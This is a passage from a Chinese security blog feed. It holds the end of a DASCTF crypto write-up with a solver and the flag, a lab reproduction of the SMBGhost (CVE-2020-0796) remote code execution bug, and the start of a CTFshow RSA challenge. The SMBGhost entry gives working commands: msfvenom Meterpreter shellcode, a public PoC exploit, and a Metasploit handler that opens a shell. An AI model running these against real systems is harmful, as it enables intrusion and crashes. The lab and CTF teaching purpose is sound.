data-num="8"></td><td><pre>i <span class="token operator">=</span> <span class="token number">87</span> 	j <span class="token operator">=</span> <span class="token constant">R</span></pre></td></tr><tr><td data-num="9"></td><td><pre>i <span class="token operator">=</span> <span class="token number">92</span> 	j <span class="token operator">=</span> <span class="token constant">T</span></pre></td></tr><tr><td data-num="10"></td><td><pre>i <span class="token operator">=</span> <span class="token number">97</span> 	j <span class="token operator">=</span> <span class="token constant">V</span></pre></td></tr></table></figure><p>满足 <code>encrypt('l', i, si)=='29'</code>  的结果：</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre>i <span class="token operator">=</span> <span class="token number">54</span> 	j <span class="token operator">=</span> <span class="token class-name">A</span></pre></td></tr><tr><td data-num="2"></td><td><pre>i <span class="token operator">=</span> <span class="token number">55</span> 	j <span class="token operator">=</span> <span class="token class-name">U</span></pre></td></tr><tr><td data-num="3"></td><td><pre>i <span class="token operator">=</span> <span class="token number">61</span> 	j <span class="token operator">=</span> <span class="token class-name">M</span></pre></td></tr><tr><td data-num="4"></td><td><pre>i <span class="token operator">=</span> <span class="token number">67</span> 	j <span class="token operator">=</span> <span class="token class-name">E</span></pre></td></tr><tr><td data-num="5"></td><td><pre>i <span class="token operator">=</span> <span class="token number">68</span> 	j <span class="token operator">=</span> <span class="token class-name">Y</span></pre></td></tr><tr><td data-num="6"></td><td><pre>i <span class="token operator">=</span> <span class="token number">74</span> 	j <span class="token operator">=</span> <span class="token class-name">Q</span></pre></td></tr><tr><td data-num="7"></td><td><pre>i <span class="token operator">=</span> <span class="token number">80</span> 	j <span class="token operator">=</span> <span class="token class-name">I</span></pre></td></tr><tr><td data-num="8"></td><td><pre>i <span class="token operator">=</span> <span class="token number">86</span> 	j <span class="token operator">=</span> <span class="token class-name">A</span></pre></td></tr><tr><td data-num="9"></td><td><pre>i <span class="token operator">=</span> <span class="token number">87</span> 	j <span class="token operator">=</span> <span class="token class-name">U</span></pre></td></tr><tr><td data-num="10"></td><td><pre>i <span class="token operator">=</span> <span class="token number">93</span> 	j <span class="token operator">=</span> <span class="token class-name">M</span></pre></td></tr><tr><td data-num="11"></td><td><pre>i <span class="token operator">=</span> <span class="token number">99</span> 	j <span class="token operator">=</span> <span class="token class-name">E</span></pre></td></tr></table></figure><p>相同的 i 只有 67，说明随机数 <code>a=67</code> 。</p>
<p>然后拿着 a 去继续爆 salt 的后两位：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'56'</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>	<span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'j ='</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">if</span> <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'66'</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'j ='</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span></pre></td></tr></table></figure><p>最终得出 <code>salt='JESQ'</code> 。<br />
知道了随机出 a 和 salt，这道题就出来了：</p>
<p>exp：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>from random <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>from string <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="3"></td><td><pre>from itertools <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>def <span class="token function">decrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>	c<span class="token operator">=</span><span class="token string">""</span></pre></td></tr><tr><td data-num="7"></td><td><pre>	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>		c<span class="token operator">+=</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> a <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span>si<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">zfill</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token keyword">return</span> c</pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    a<span class="token operator">=</span><span class="token number">67</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    salt <span class="token operator">=</span> <span class="token string">'JESQ'</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    si <span class="token operator">=</span> <span class="token function">cycle</span><span class="token punctuation">(</span>salt<span class="token punctuation">.</span><span class="token function">lower</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    c <span class="token operator">=</span> <span class="token string">'3472184e657e50561c481f5c1c4e1938163e154431015e13062c1b073d4e3a444f4a5c5c7a071919167b034e1c29566647600c4e1c2956661b6c1f50622f0016317e563546202a'</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    q<span class="token operator">=</span><span class="token function">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token comment">//2</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    s<span class="token operator">=</span><span class="token string">''</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        b<span class="token operator">=</span>c<span class="token punctuation">[</span><span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        c<span class="token operator">=</span>c<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        sm<span class="token operator">=</span><span class="token function">next</span><span class="token punctuation">(</span>si<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            m<span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            c1<span class="token operator">=</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> a <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span>sm<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">zfill</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token function">#print</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>c1<span class="token punctuation">,</span><span class="token function">int</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>base<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">int</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>base<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">int</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span>base<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">int</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>base<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                s<span class="token operator">+=</span>m</pre></td></tr><tr><td data-num="28"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token function">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>now_is_7fad9fcb<span class="token operator">-</span>d361<span class="token operator">-</span><span class="token number">4964</span><span class="token operator">-</span>821c<span class="token operator">-</span>177c906b8d20_flag_is_flag<span class="token punctuation">&#123;</span><span class="token function">md5</span><span class="token punctuation">(</span>now<span class="token operator">-</span>salt<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>根据要求<strong> md5 加密</strong> <code>now-salt</code>  即可得到 flag。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>now<span class="token operator">-</span>salt<span class="token operator">:</span>7fad9fcb<span class="token operator">-</span>d361<span class="token operator">-</span><span class="token number">4964</span><span class="token operator">-</span>821c<span class="token operator">-</span>177c906b8d20<span class="token operator">-</span><span class="token constant">JESQ</span></pre></td></tr></table></figure><p>最终 flag 为：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token punctuation">&#123;</span>1efce62ee0a96e39149e2179db1dd04c<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hpYWhpYWNoYW5nL2FydGljbGUvZGV0YWlscy8xMDg4MDAyMTA=">参考链接</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0hpdGFjb24vYXJ0aWNsZS9kZXRhaWxzLzEwNjMwOTAwMA==">DASCTF 密码第一题</span></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-0796 (SMBv3远程代码执行) Windows-10</title>
    <url>/article/39bc4a94.html</url>
    <content><![CDATA[<h2 id="cve-2020-0796-简介"><a class="anchor" href="#cve-2020-0796-简介">#</a> CVE-2020-0796 - 简介</h2>
<h3 id="漏洞名称"><a class="anchor" href="#漏洞名称">#</a> 【漏洞名称】</h3>
<p><code>SMB</code>  远程代码执行漏洞（ <code>CVE-2020-0796</code> ），有安全研究者取名 “ <code>SMBGhost</code> ”。</p>
<h3 id="漏洞类型"><a class="anchor" href="#漏洞类型">#</a> 【漏洞类型】</h3>
<p>远程代码执行</p>
<h3 id="漏洞等级"><a class="anchor" href="#漏洞等级">#</a> 【漏洞等级】</h3>
<p>高危</p>
<h3 id="漏洞描述"><a class="anchor" href="#漏洞描述">#</a> 【漏洞描述】</h3>
<p>微软 3 月 11 日发布 3 月例行更新，其中并未公布编号为 <code>CVE-2020-0796</code>  的高危漏洞资料，但该漏洞却最为引人注目。次日晚（2020 年 3 月 12 日）微软正式发布 <code>CVE-2020-0796</code>  高危漏洞补丁。</p>
<p><code>SMB 3.1.1</code>  协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。</p>
<p>攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。</p>
<p>该漏洞的后果十分接近永恒之蓝系列，都利用 <code>Windows SMB</code>  漏洞远程攻击获取系统最高权限， <code>WannaCry</code>  勒索蠕虫就是利用永恒之蓝系列漏洞攻击工具制造的大灾难。除了直接攻击 <code>SMB</code>  服务端造成 <code>RCE</code>  外，该漏洞得亮点在于对 <code>SMB</code>  客户端的攻击，攻击者可以构造特定的网页，压缩包，共享目录， <code>OFFICE</code>  文档等多种方式触发漏洞进行攻击。</p>
<p>该漏洞并未出现在微软 3 月的例行更新列表，有国外安全厂商意外发布了有关该漏洞存在的消息，随后引发行业关注。</p>
<h3 id="漏洞版本"><a class="anchor" href="#漏洞版本">#</a> 【漏洞版本】</h3>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>漏洞不影响win7，漏洞影响Windows <span class="token number">10</span> <span class="token number">1903</span>之后的各个<span class="token number">32</span>位、<span class="token number">64</span>位版Windows，包括家用版、专业版、企业版、教育版。</pre></td></tr><tr><td data-num="2"></td><td><pre>Windows <span class="token number">10</span> Version <span class="token number">1903</span> <span class="token keyword">for</span> <span class="token number">32</span><span class="token operator">-</span>bit Systems</pre></td></tr><tr><td data-num="3"></td><td><pre>Windows <span class="token number">10</span> Version <span class="token number">1903</span> <span class="token keyword">for</span> x64<span class="token operator">-</span>based Systems</pre></td></tr><tr><td data-num="4"></td><td><pre>Windows <span class="token number">10</span> Version <span class="token number">1903</span> <span class="token keyword">for</span> <span class="token constant">ARM64</span><span class="token operator">-</span>based Systems</pre></td></tr><tr><td data-num="5"></td><td><pre>Windows Server<span class="token punctuation">,</span> Version <span class="token number">1903</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>Windows <span class="token number">10</span> Version <span class="token number">1909</span> <span class="token keyword">for</span> <span class="token number">32</span><span class="token operator">-</span>bit Systems</pre></td></tr><tr><td data-num="7"></td><td><pre>Windows <span class="token number">10</span> Version <span class="token number">1909</span> <span class="token keyword">for</span> x64<span class="token operator">-</span>based Systems</pre></td></tr><tr><td data-num="8"></td><td><pre>Windows <span class="token number">10</span> Version <span class="token number">1909</span> <span class="token keyword">for</span> <span class="token constant">ARM64</span><span class="token operator">-</span>based Systems</pre></td></tr><tr><td data-num="9"></td><td><pre>Windows Server<span class="token punctuation">,</span> Version <span class="token number">1909</span> <span class="token punctuation">(</span>Server Core installation<span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="漏洞复现"><a class="anchor" href="#漏洞复现">#</a> 漏洞复现</h3>
<p><code>RCE</code>  到  <code>Metasploit</code></p>
<p>使用迅雷下载  <code>win-10</code>  的  <code>iso</code>  镜像并安装系统：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Win <span class="token number">10</span><span class="token operator">-</span><span class="token number">1903</span> 迅雷下载 ：ed2k<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token operator">|</span>file<span class="token operator">|</span>cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c<span class="token punctuation">.</span>iso<span class="token operator">|</span><span class="token number">4815527936</span><span class="token operator">|</span>47D4C57E638DF8BF74C59261E2CE702D<span class="token operator">|</span></pre></td></tr></table></figure><p>首先查了一下补丁情况，发现没有 ： <code>KB4551762</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211014195125424-818737904.png" alt="img" /></p>
<p>通过齐安信的漏洞检测脚本发现存在漏洞：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>dl<span class="token punctuation">.</span>qianxin<span class="token punctuation">.</span>com<span class="token operator">/</span>skylar6<span class="token operator">/</span><span class="token constant">CVE</span><span class="token operator">-</span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">0796</span><span class="token operator">-</span>Scanner<span class="token punctuation">.</span>zip</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token constant">C</span><span class="token operator">:</span>\Users\<span class="token constant">CVE</span><span class="token operator">-</span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">0796</span>\Desktop\<span class="token constant">CVE</span><span class="token operator">-</span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">0796</span><span class="token operator">-</span>Scanner<span class="token operator">></span><span class="token constant">CVE</span><span class="token operator">-</span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">0796</span><span class="token operator">-</span>Scanner<span class="token punctuation">.</span>exe</pre></td></tr><tr><td data-num="5"></td><td><pre>请输入目标<span class="token constant">IP</span>或<span class="token constant">IP</span><span class="token literal-property property">范围</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">192.168</span><span class="token number">.146</span><span class="token number">.156</span></pre></td></tr><tr><td data-num="7"></td><td><pre>本漏洞扫描工具仅限于网络安全管理员发现本组织的问题系统使用，依据网络安全法，任何攻击为目的对非授权系统的非法使用所导致的后果自负。</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 目标 <span class="token punctuation">[</span><span class="token number">192.168</span><span class="token number">.146</span><span class="token number">.156</span><span class="token punctuation">]</span> 已支持<span class="token constant">SMB</span> v3<span class="token punctuation">.</span><span class="token number">1.1</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> 警告！目标 <span class="token punctuation">[</span><span class="token number">192.168</span><span class="token number">.146</span><span class="token number">.156</span><span class="token punctuation">]</span> 仍存在漏洞风险</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211014195155529-610640518.png" alt="img" /></p>
<p>通过 MSF 生成 shellcode：（用正向）</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcp lport<span class="token operator">=</span><span class="token number">9999</span> <span class="token operator">-</span>f py <span class="token operator">-</span>o shellcode<span class="token punctuation">.</span>txt</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211014195212009-1729536597.png" alt="img" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211014195227188-776956928.png" alt="img" /></p>
<p>然后我们通过下载 exp 脚本：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>chompie1337<span class="token operator">/</span>SMBGhost_RCE_PoC<span class="token punctuation">.</span>git</pre></td></tr></table></figure><p>把刚刚  <code>MSF</code>  生成的  <code>shellcode</code>  里的  <code>buf</code>  替换成  <code>USER_PAYLOAD</code> ：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211014195242375-2005450108.png" alt="img" /></p>
<p>这个时候 MSF 就可以启动监听了：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>msfconsole</pre></td></tr><tr><td data-num="2"></td><td><pre>use exploit<span class="token operator">/</span>multi<span class="token operator">/</span>handler </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">set</span> payload windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcpset </pre></td></tr><tr><td data-num="4"></td><td><pre>lport 9999set rhost <span class="token number">192.168</span><span class="token number">.146</span><span class="token number">.156</span></pre></td></tr><tr><td data-num="5"></td><td><pre>exploit</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211014195304113-1438216520.png" alt="img" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211014195314705-1164233527.png" alt="img" /></p>
<p>然后运行 Python 脚本反弹会话：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>python3 exploit<span class="token punctuation">.</span>py <span class="token operator">-</span>ip <span class="token number">192.168</span><span class="token number">.146</span><span class="token number">.156</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211014195331555-83256380.png" alt="img" /></p>
<p>有效显示：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211014195345412-862054042.png" alt="img" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211014195356644-844751591.png" alt="img" /></p>
<p>注意！！！</p>
<p>有很大的几率会导致目标系统蓝屏！<br />
<img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/2467930-20211014195411737-876590080.png" alt="img" /></p>
<p>emo，小编成功蓝屏 2333!</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow月饼杯Crypto3_多少离杯WP</title>
    <url>/article/a7cc6afa.html</url>
    <content><![CDATA[<p><span class="exturl" data-url="aHR0cHM6Ly9jdGYuc2hvdy9jaGFsbGVuZ2VzI2NyeXB0bzNfJUU1JUE0JTlBJUU1JUIwJTkxJUU3JUE2JUJCJUU2JTgwJTgwLTQ4NQ==">题目链接</span></p>
<p><strong>多少离怀起清夜，人间重望一回圆。</strong></p>
<p><code>Weird Γ(x).py</code> :</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre># <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token operator">:</span>utf<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span></pre></td></tr><tr><td data-num="2"></td><td><pre>#Author<span class="token operator">:</span> Lazzaro</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>from Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span>isPrime</pre></td></tr><tr><td data-num="5"></td><td><pre>from math <span class="token keyword">import</span> gamma</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>def <span class="token function">nextPrime</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    n <span class="token operator">+=</span> <span class="token number">2</span> <span class="token keyword">if</span> n <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token keyword">else</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">while</span> not <span class="token function">isPrime</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        n <span class="token operator">+=</span> <span class="token number">2</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">return</span> n</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>def <span class="token function">getNewPrime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token constant">A</span> <span class="token operator">=</span> <span class="token function">getPrime</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token constant">B</span> <span class="token operator">=</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span><span class="token constant">A</span> <span class="token operator">-</span> random<span class="token punctuation">.</span><span class="token function">randint</span><span class="token punctuation">(</span><span class="token number">1e4</span><span class="token punctuation">,</span><span class="token number">1e5</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">nextPrime</span><span class="token punctuation">(</span><span class="token function">gamma</span><span class="token punctuation">(</span><span class="token constant">B</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token constant">A</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>	</pre></td></tr><tr><td data-num="19"></td><td><pre>p <span class="token operator">=</span> <span class="token function">getNewPrime</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>q <span class="token operator">=</span> <span class="token function">getNewPrime</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>r <span class="token operator">=</span> <span class="token function">getNewPrime</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>n <span class="token operator">=</span> p <span class="token operator">*</span> q <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">*</span> r <span class="token operator">**</span> <span class="token number">3</span></pre></td></tr><tr><td data-num="23"></td><td><pre>e <span class="token operator">=</span> <span class="token number">0x10001</span></pre></td></tr><tr><td data-num="24"></td><td><pre>c <span class="token operator">=</span> <span class="token function">pow</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>#pA<span class="token operator">=</span><span class="token number">6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723982789</span></pre></td></tr><tr><td data-num="27"></td><td><pre>#pB<span class="token operator">=</span><span class="token number">6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723922147</span></pre></td></tr><tr><td data-num="28"></td><td><pre>#qA<span class="token operator">=</span><span class="token number">7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477881291</span></pre></td></tr><tr><td data-num="29"></td><td><pre>#qB<span class="token operator">=</span><span class="token number">7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477807457</span></pre></td></tr><tr><td data-num="30"></td><td><pre>#n<span class="token operator">=</span><span class="token number">4451906216583258787166698210560165433649728830889954633721198623488802305844782492171757604711145165920462286487680020347239300947225371917344589502941576734875830871998499135120227347066586066943289430156378296665669974728569678779668142712266780949126509440672273927433367293606776081254094682033167575930701870261219046464773708974194213798032346187463443317770758989273370488582862531630356263732232300508706676725203199729764016766683870925164232508407363688370458877688991733322055785233669885166225464068579486683574954699370175267031949720967812902215635630884502987094547523361027411501285252862476410213277925430392164226297316310465146003494714018456407793759170649913180823814850170639706664167149612984905056804131124522209409607977589884632999710708045656852149371030046919242039957767777840304466948549383597755811307383659188216421501912831203089570725388153416013596114462069777713822433178099904907224119</span></pre></td></tr><tr><td data-num="31"></td><td><pre>#c<span class="token operator">=</span><span class="token number">1996198968748552041728429851810599627895157160099076033250854211280074825148767841655949210593646824507865483166496070951130337321360509148527292165245205219296211294789087358959553387392928560150390604911087085313000622842025416521494799132969818997182731021267942464323979261593380113740152841984062184326431879167516288834455296913822921806893572566867611541664848820247889274979245086440402996661226884320574824077910315143756471444347386795428338020162169391827182914043434253974549636668126789355991920452920806351939782281969098470635517019120996509180703896707990501216102290302162705699788457579330150149320348175742131887213742989509004374645723471497302400169849858253644606818874098604333865973357374444445825761600866472906771935670261641342221394488068630591190697667016958881530367047928341661857241378511420562236766886349565409774340321441504290366223243635878057759623855735794209219474650425139791831374</span></pre></td></tr></table></figure><p><code>hint</code> ：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">注意伽马函数Γ</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>和阶乘x<span class="token operator">!</span>的关系式</pre></td></tr><tr><td data-num="2"></td><td><pre>威尔逊定理</pre></td></tr></table></figure><p>知识点:</p>
